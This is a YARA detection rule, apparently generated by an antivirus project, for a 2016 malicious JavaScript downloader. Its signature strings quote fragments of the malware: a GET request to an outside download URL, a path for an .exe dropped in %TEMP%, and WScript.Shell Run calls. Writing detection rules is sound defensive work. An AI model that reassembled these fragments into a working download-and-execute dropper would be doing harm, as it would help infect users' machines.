rule sig_20160329_7b24575a49c1fb2bc3ef7335d56e0223 {
  meta:
    description = "datamaliciousorder - file 20160329_7b24575a49c1fb2bc3ef7335d56e0223.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6366bb3d0c64acbb10e43e04f9bce84e7ac37717eae37407b1ec2fb8e55f94f4"

  strings:
    $s1  = "xS[Am](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function NE() {return c[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RVwLBpNK4V8XHWL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[p](I() * 11); if (xS[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function H(s, X){dL = dL * 1; return s - X;};" fullword ascii
    $s5  = "var c = function lg() {return WScript[F](\"WScript.Shell\");}(), UQ = 11;" fullword ascii
    $s6  = "function W(){return \"\" + A;};" fullword ascii
    $s7  = "function gY() {return ((R == true) && (R == oD)) ? 1 : dL;};" fullword ascii
    $s8  = "function i(GS){c[\"Run\"](GS, dL, dL);};" fullword ascii
    $s9  = "var q = new this[\"Date\"]();" fullword ascii
    $s10 = "function I(){return 22;};" fullword ascii
    $s11 = " while (J){" fullword ascii
    $s12 = "function Q(){return F;};" fullword ascii
    $s13 = "function cF()" fullword ascii
    $s14 = "function uz(OM) {var Ib = (1, 2, 3, 4, 5, OM); return Ib;};" fullword ascii
    $s15 = "return H(lj, SP);" fullword ascii
    $s16 = "var h = false;" fullword ascii
    $s17 = "var oD = false;" fullword ascii
    $s18 = "oD = true; " fullword ascii
    $s19 = "} catch(p0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}